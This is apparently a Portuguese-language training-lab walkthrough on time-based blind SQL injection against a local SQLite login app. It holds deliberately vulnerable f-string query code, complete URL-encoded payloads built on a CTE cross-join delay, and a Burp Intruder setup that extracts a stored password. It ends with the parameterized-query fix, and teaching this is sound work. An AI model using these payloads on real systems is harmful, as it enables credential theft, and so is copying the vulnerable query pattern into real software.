# Walkthrough — sqli-blind-time

## 1. Contexto

A app expõe um login de página única. Você digita username e password em `/`, o form dispara um `POST /login`, e o servidor consulta uma tabela `users` no SQLite procurando uma linha que case com os dois campos. Mas, diferente de um login normal, a resposta é **sempre a mesma página**, retornada com HTTP 200 e um body fixo:

```
Login attempt processed.
```

Credencial correta, credencial errada, lixo — toda request recebe essa mesma mensagem neutra. Um dev achatou as antigas páginas "Welcome" / "Invalid credentials" numa resposta única para impedir enumeration de usuário. Isso é um hardening legítimo, e de fato mata o oráculo boolean-based: não existe mais nenhum texto no body que difira entre uma condição verdadeira e uma falsa. O que isso **não** faz é corrigir a SQL injection embaixo — e isso deixa exatamente um canal observável aberto: o **tempo**.

Três usuários estão no seed (`alice`, `bob`, `carol`); a senha da alice é `wonderland`. Junto com `users`, o mesmo arquivo de banco tem uma tabela `secrets` espelhando o schema do atom-01, mantida aqui por reconhecimento mas não é o alvo do exploit deste átomo.

> **Veja a premissa uma vez, no browser.** Abra <http://127.0.0.1:8007/> e logue como `alice` / `wonderland`. Você recebe `Login attempt processed.` — a *mesma* página que você teria com qualquer senha errada. Não há "sucesso" visível. Essa resposta uniforme é toda a premissa deste átomo. Daqui em diante, tudo acontece no Burp.

## 2. Ache o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). A view `/login` monta o SQL assim:

```python
username = request.form.get("username", "")
password = request.form.get("password", "")
# VULNERABLE: user input concatenated into SQL string
query = (
    f"SELECT username FROM users "
    f"WHERE username = '{username}' AND password = '{password}'"
)
conn.execute(query).fetchone()  # result intentionally ignored — response is uniform
return render_template("result.html")
```

É a mesma classe de bug do [`sqli-union-basic`](../sqli-union-basic/) e do [`sqli-blind-boolean`](../sqli-blind-boolean/) — input do usuário colado numa string SQL via f-string, sem escape, sem parameter binding. O que mudou são as duas últimas linhas. No `sqli-blind-boolean` a view branchava conforme o `fetchone()` retornava uma linha ou não, e renderizava uma de duas páginas; aquele branch *era* o oráculo. Aqui a linha é buscada e **jogada fora**, e o template é o mesmo independentemente. A query ainda roda — isso importa daqui a pouco — mas o resultado dela não consegue mais controlar a resposta.

Então o atacante tem a mesma capacidade de injeção e **nenhum oráculo no body**. Os dois estados de resposta dos quais o boolean attack dependia colapsaram numa página byte-a-byte idêntica. A única coisa que uma condição injetada ainda influencia é quanto a query demora para rodar, e portanto quanto o cliente espera. É esse o canal em que este walkthrough inteiro anda.

## 3. Exploração via Burp Suite

Este átomo é trabalhado inteiramente no Burp Suite (Proxy → Repeater → Intruder). A interface web existe apenas como destino legítimo das requests.

O form de login em `/` dispara um `POST /login` com body form-encoded `username=<...>&password=<...>`. Monte esse request numa nova aba do Repeater apontando pra `127.0.0.1:8007` e mande uma vez com as credenciais do seed (`username=alice&password=wonderland`): a resposta volta instantânea com `Login attempt processed.`. Repare no tempo de resposta — o Burp mostra ele no rodapé do painel Response, alguns milissegundos. Essa resposta rápida e uniforme é o seu baseline. Cada passo abaixo edita o body e reenvia, e a única coisa que você observa é **quanto a resposta demora**.

> **Convenção de notação.** `N`, `P` e `C` nomeiam os valores que você varre — um comprimento candidato, uma posição de caractere, um caractere candidato. Cada payload abaixo já vem com eles preenchidos com um valor concreto (ex.: `N = 10`); pra varrer, você edita só aquele número ou letra e reenvia (não cole um `N`/`P`/`C` literal). A expressão de delay é o oposto: aparece **por extenso em todo payload**, byte a byte idêntica toda vez, sem nada dentro pra substituir — `K`, o `18000` dela, é aquela constante fixa, pré-calibrada, que você não varia.

### Uma nota sobre encoding do body

Os átomos anteriores cobriram o básico: espaços viram `%20`, e dentro de um value form-encoded os caracteres estruturais `=` (`%3D`), `&` (`%26`) e `%` (`%25`) precisam de encode. Este átomo adiciona mais um que morde feio se você esquecer:

- **`+` precisa ser encodado como `%2B`.** Num body `application/x-www-form-urlencoded`, um `+` literal decoda como *espaço*. A expressão de delay abaixo contém `x+1`; se você colar cru, o servidor recebe `x 1`, o SQL quebra, e você ganha um erro em vez de um delay. Todo `+` no body tem que viajar como `%2B`.

Aspas (`'` → `%27`), parênteses, vírgulas, asteriscos e o operador `<` são legais dentro de um value e podem viajar como estão. Como antes, você pode digitar o encoding mínimo na mão ou colar o payload decoded e apertar **Ctrl+U** no Repeater. Cada passo abaixo mostra um **Body (decoded)** pra leitura e um **Body (Burp-ready)** pronto pra colar.

### A primitiva de delay no SQLite — por que não tem `SLEEP()`

Time-based blind SQLi precisa de um jeito de fazer o banco queimar tempo *sob demanda*. Na maioria das engines você usa um built-in: MySQL tem `SLEEP(n)`, PostgreSQL tem `pg_sleep(n)`, MSSQL tem `WAITFOR DELAY`. **O SQLite não tem nenhum deles.** É o momento em que conhecer o backend decide o seu payload: contra SQLite você precisa *construir* o delay a partir de trabalho que a engine de fato vai fazer.

A primitiva usada aqui é um recursive CTE pequeno, cross-joined consigo mesmo:

```
(WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b)
```

O CTE constrói uma tabelinha `t` de `K = 18000` linhas, e então `count(*) FROM t a, t b` conta os `K²` ≈ 324 milhões de pares do cross join. Contar esses pares é trabalho puro de CPU e leva alguns segundos, mas a memória fica estável: a única coisa materializada é a tabela de `K` linhas (dezenas de KB), nunca os `K²` pares. `K = 18000` foi calibrado contra o container deste lab (SQLite 3.46.1) pra cair em torno de **3–4 segundos** por execução; o número exato é CPU-dependente, então se os seus delays voltarem bem mais curtos ou longos, ajuste `K` (o tempo cresce com `K²`, então mudanças pequenas movem bastante). O que importa nunca é o número absoluto — é o *contraste* entre segundos e milissegundos. Você vai ver esse bloco exato, por extenso, dentro de todo payload abaixo — ele nunca é abreviado.

### Step 1 — Provar a injeção *e* descobrir o único canal

Não há bloco de debug, nem erro, nem linha pra ler — então o primeiro probe tem que ser o próprio delay. Injete a expressão de forma incondicional e olhe o relógio.

Body (decoded):

```
username=alice' AND (WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b) -- &password=x
```

Body (Burp-ready):

```
username=alice%27%20AND%20(WITH%20RECURSIVE%20t(x)%20AS%20(SELECT%201%20UNION%20ALL%20SELECT%20x%2B1%20FROM%20t%20WHERE%20x%20<%2018000)%20SELECT%20count(*)%20FROM%20t%20a,%20t%20b)%20--%20&password=x
```

Mande. A página volta como sempre — `Login attempt processed.` — mas só **depois de uma pausa de ~3–4 segundos**. Leia o que rodou:

```sql
SELECT username FROM users WHERE username = 'alice' AND (WITH RECURSIVE t(x) AS (...) SELECT count(*) FROM t a, t b) -- ' AND password = 'x'
```

A `'` fecha o literal do username; `--` comenta o `' AND password = 'x'` final. `alice` casa uma linha (é um user real, indexado), o `AND` força a engine a avaliar a subquery do cross join, e contar 18000² pares queima os segundos. O count é não-zero, então a linha tecnicamente casa, mas isso é irrelevante — o body é uniforme de qualquer jeito.

Esse é o coração conceitual do átomo. No `sqli-blind-boolean`, *confirmar a injeção* (o login-bypass do Step 1 dele) e *estabelecer o oráculo* (os Steps 2–3 dele) eram movimentos separados, porque havia um sinal no body desde a primeira request. Aqui não há sinal nenhum no body, nunca — então a **primeira evidência de que existe injeção já é um delay**. Confirmar o bug e estabelecer o oráculo são o mesmo ato. O tempo é o canal desde o primeiro probe.

**O que isso NÃO é:** uma única resposta lenta não prova nada sozinha — poderia ser jitter de rede ou servidor ocupado. A prova é *repetibilidade e controle*. Reenvie esse payload duas ou três vezes: ele trava toda vez. Depois mande o benigno `username=alice&password=wonderland` de novo: instantâneo. O sinal de time-based blind não é "a resposta foi lenta", é "eu consigo deixar a resposta lenta sob demanda, e rápida de novo sob demanda". O Step 2 transforma esse controle num oráculo de sim/não.

### Step 2 — Tornar o delay condicional (o oráculo temporal)

Envolva o delay num `CASE` pra ele só disparar quando uma condição é verdadeira. O `CASE` do SQLite avalia só o ramo cujo `WHEN` casou, então a expressão cara no `THEN` só roda numa condição verdadeira.

Body (decoded) — ramo true:

```
username=alice' AND (SELECT CASE WHEN (1=1) THEN (WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b) ELSE 1 END) -- &password=x
```

Body (Burp-ready) — ramo true:

```
username=alice%27%20AND%20(SELECT%20CASE%20WHEN%20(1%3D1)%20THEN%20(WITH%20RECURSIVE%20t(x)%20AS%20(SELECT%201%20UNION%20ALL%20SELECT%20x%2B1%20FROM%20t%20WHERE%20x%20<%2018000)%20SELECT%20count(*)%20FROM%20t%20a,%20t%20b)%20ELSE%201%20END)%20--%20&password=x
```

Mande: delay de **~3–4 segundos**. Agora troque a única condição `1=1` por `1=2` (Burp-ready: `1%3D2`) e mande de novo: a resposta é **instantânea**. O ramo `ELSE 1` retorna uma constante, o cross join nunca roda, nenhum tempo é queimado.

Você agora tem os dois estados do oráculo, lidos no relógio em vez de na página:

- condição **verdadeira** → a resposta trava alguns segundos
- condição **falsa** → a resposta é instantânea

Qualquer pergunta de sim/não que você consiga expressar em SQL pode agora ser respondida colocando ela no slot `WHEN (...)` e cronometrando a resposta. É o gêmeo temporal do Step 2/3 do `sqli-blind-boolean`: a *pergunta* fica exatamente no mesmo lugar; só o que *responde* mudou — latency, não texto.

### Step 3 — Extrair o comprimento da senha por timing

Troque a condição placeholder por uma sobre dado real: o comprimento da senha da alice é igual a `N`? Comece com um probe concreto que pergunta se o comprimento é 10.

Body (decoded):

```
username=alice' AND (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='alice') = 10) THEN (WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b) ELSE 1 END) -- &password=x
```

Body (Burp-ready):

```
username=alice%27%20AND%20(SELECT%20CASE%20WHEN%20((SELECT%20LENGTH(password)%20FROM%20users%20WHERE%20username%3D%27alice%27)%20%3D%2010)%20THEN%20(WITH%20RECURSIVE%20t(x)%20AS%20(SELECT%201%20UNION%20ALL%20SELECT%20x%2B1%20FROM%20t%20WHERE%20x%20<%2018000)%20SELECT%20count(*)%20FROM%20t%20a,%20t%20b)%20ELSE%201%20END)%20--%20&password=x
```

Itere o número no mesmo lugar (no Repeater, edite só o `10`) e cronometre cada resposta:

- `... = 5)  ...` → instantâneo (o comprimento não é 5)
- `... = 10) ...` → **delay de ~3–4 segundos** (o comprimento é 10)
- `... = 15) ...` → instantâneo

Conclusão: a senha da alice tem **10 caracteres**. Você descobriu um fato sobre um dado que não consegue ler, puramente pela latency da resposta. Fazer dois ou três probes na mão é o suficiente pra sentir o ritmo antes do próximo passo aumentar a escala.

### Step 4 — Extrair um caractere por timing

Pergunta mais fina: o caractere na posição `P` é igual ao candidato `C`? `SUBSTR(password, P, 1)` extrai um caractere; a comparação transforma ele no único bit que o cronômetro revela. Comece testando o primeiro caractere (`P = 1`) contra o candidato `w`.

Body (decoded):

```
username=alice' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='alice'),1,1) = 'w') THEN (WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b) ELSE 1 END) -- &password=x
```

Body (Burp-ready):

```
username=alice%27%20AND%20(SELECT%20CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27alice%27),1,1)%20%3D%20%27w%27)%20THEN%20(WITH%20RECURSIVE%20t(x)%20AS%20(SELECT%201%20UNION%20ALL%20SELECT%20x%2B1%20FROM%20t%20WHERE%20x%20<%2018000)%20SELECT%20count(*)%20FROM%20t%20a,%20t%20b)%20ELSE%201%20END)%20--%20&password=x
```

Na mão, no primeiro caractere: como enviado acima, o candidato `'w'` faz a resposta travar **~3–4 segundos** — então o primeiro caractere é `w`. Troque por qualquer outra letra (`'a'`, `'b'`, …) e a resposta volta instantânea.

Os dois argumentos numéricos do `SUBSTR` têm papéis distintos, e a distinção importa pro próximo passo. O primeiro (`1`) é a *posição* — qual caractere ler, o que você varia pra varrer a senha inteira. O segundo (`1`) é o *tamanho* — quantos caracteres ler, sempre 1.

### Step 5 — Automatizar com Burp Intruder, lendo a coluna de latency

É aqui que você reusa o `sqli-blind-boolean` quase verbatim. A configuração do Intruder é **idêntica** à daquele átomo — mesmo attack type, mesmos dois payload sets — com exatamente **uma** diferença: qual coluna você lê como oráculo. Lá, era um checkbox do Grep — Match. Aqui, toda response body é byte-a-byte idêntica, então não há string pra casar; o oráculo é a **coluna de response time**.

Request base (o payload que funcionou no Step 4), com as duas payload positions marcadas com `§...§`:

```
username=alice' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='alice'),§1§,1) = '§w§') THEN (WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b) ELSE 1 END) -- &password=x
```

(Os nomes de menu abaixo são do Burp Community Edition; no Pro são idênticos.)

1. **Send to Intruder.** Clique com o botão direito no request que funcionou no Repeater → **Send to Intruder**, e vá pra aba Intruder. Garanta que o body ainda tem `x%2B1` dentro da expressão de delay — o Intruder manda o texto estático do request base como está, então um `+` cru aqui decodaria pra espaço e quebraria o burn igual no Repeater.
2. **Marque duas payload positions** com `§...§`: o argumento de **posição** do `SUBSTR` (o primeiro `1`, varia `1` → `10`) e o caractere **candidato** (o `w`, varia `a` → `z`). **Não** marque o `1` do argumento de *tamanho* do `SUBSTR`, nem nenhum dígito do `18000` da expressão de delay — há vários dígitos literais no payload, e marcar o errado quebra o ataque.
3. **Attack type:** `Cluster bomb` — o produto cartesiano dos dois payload sets, toda posição combinada com todo candidato.
4. **Payload set 1 (a posição):** `Numbers`, **From `1`, To `10`, Step `1`** — 10 payloads. **Comece em `1`, não em `0`.** O SQLite indexa strings a partir de 1: `SUBSTR(password, 1, 1)` é o primeiro caractere, enquanto `SUBSTR(password, 0, 1)` retorna string vazia, que nunca casa com nenhuma letra candidata. Um range que começa em `0` faz, então, aquela posição voltar *rápida* pra toda letra — sem hit, sem erro pra te dizer por quê, e o ataque só parece quebrado. O range tem que ser `1`–`10`.
5. **Payload set 2 (o candidato):** `Simple list`, as 26 letras minúsculas, uma por linha. (Não use `Brute forcer` — ele explode em 26ⁿ.) Request count: **260** (10 × 26).
6. **Defina o oráculo como tempo, e serialize o ataque.** Esta é a única diferença em relação ao `sqli-blind-boolean`. Não há Grep — Match pra adicionar, porque as 260 responses são idênticas. Em vez disso leia a coluna **`Response received`** (tempo até o primeiro byte, em milissegundos; `Response completed` também serve) — habilite ela no menu de colunas da tabela de resultados se não estiver visível. E abra o **Resource pool** e ponha **Maximum concurrent requests = 1**: os payloads queimam CPU, e vários rodando ao mesmo tempo competiriam por ela e sujariam o sinal de tempo. Um por vez deixa cada medição limpa. (O Burp Community também dá throttle no Intruder, o que só adiciona um offset constante a toda request — o gap de segundos-vs-milissegundos fica intacto.)
7. **Start attack.** Ordene os resultados pela coluna `Response received`, decrescente. **10 linhas se destacam em ~3–4 segundos**, uma por posição; as outras 250 voltam em milissegundos. Leia as linhas lentas em ordem de posição: `w, o, n, d, e, r, l, a, n, d` → `wonderland`.

Essa é a senha armazenada da alice, recuperada sem ela — ou qualquer diferença na resposta exceto o relógio — jamais aparecer.

O ataque é, por natureza, **mais lento** que o boolean: cada bit custa alguns segundos no pior caso, e a concorrência é fixada em 1. Mas o resultado é idêntico. O oráculo nunca esteve no body; estava no relógio.

### Por que isso é time-based — a trilogia, do começo ao fim

A causa do bug é idêntica nos três átomos de injection: input do usuário concatenado numa string SQL sem parameter binding. O que difere é o que o atacante consegue observar, e portanto a forma do exploit.

No `sqli-union-basic` o dado vinha no body, direto. No `sqli-blind-boolean` o body só dizia sim-ou-não (`Welcome` vs `Invalid`), mas ainda dizia *algo*. Aqui o body não diz **nada** — é idêntico em toda request. Um dev achatou as mensagens pra impedir enumeration (bom instinto) mas nunca corrigiu a injeção, então o boolean oracle morreu e o atacante foi pro relógio. A mesma pergunta que o `sqli-blind-boolean` respondia lendo texto — "o caractere na posição P é igual a C?" — este átomo responde com um cronômetro. Mesma root cause, mesmo segredo (`wonderland`), mesmo fix; só o canal observável encolheu de novo, do conteúdo pro tempo.

## 4. Por que o fix funciona

Veja [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra a mudança. Em resumo: a versão fixed chama `conn.execute("... WHERE username = ? AND password = ?", (username, password))`. Com placeholders, o driver do SQLite faz o parse do statement primeiro — sem o input — e só depois liga cada valor como dado literal. O payload de timing inteiro, cross join e tudo, chega como o *value* de `username`; nunca é parseado como SQL e nunca executa.

Aponte o Repeater pra app fixed na porta **8107** e reenvie qualquer payload da seção 3 — mas atenção a uma pegadinha do Burp antes. Editar a porta no texto do request **não** muda pra onde a request vai: o Repeater envia pro destino que está no campo **Target** (o controle logo acima do editor do request, mostrando algo como `http://127.0.0.1:8007`), e o host/porta que você vê dentro das linhas do request é só texto. Clique nesse controle **Target** e mude a porta pra **8107** ali. Se você editar só o body do request ou a linha `Host`, a request continua indo pra app vulnerable na 8007, o delay ainda dispara, e o fix parece não funcionar. Com o Target de fato apontando pra 8107, todo payload retorna `Login attempt processed.` **instantaneamente** — inclusive o probe incondicional do Step 1, que contra a app vulnerable travava por segundos. A mensagem uniforme não mudou; aquela resposta achatada era anti-enumeration legítimo, nunca foi o bug. O que o atacante perdeu foi a capacidade de injetar qualquer coisa em que a engine vá gastar tempo. Sem delay controlável, o canal de timing some — do mesmo jeito que o fix parametrizado fechou o canal de body no `sqli-union-basic` e o canal boolean no `sqli-blind-boolean`. Uma root cause, um fix, três exploits.
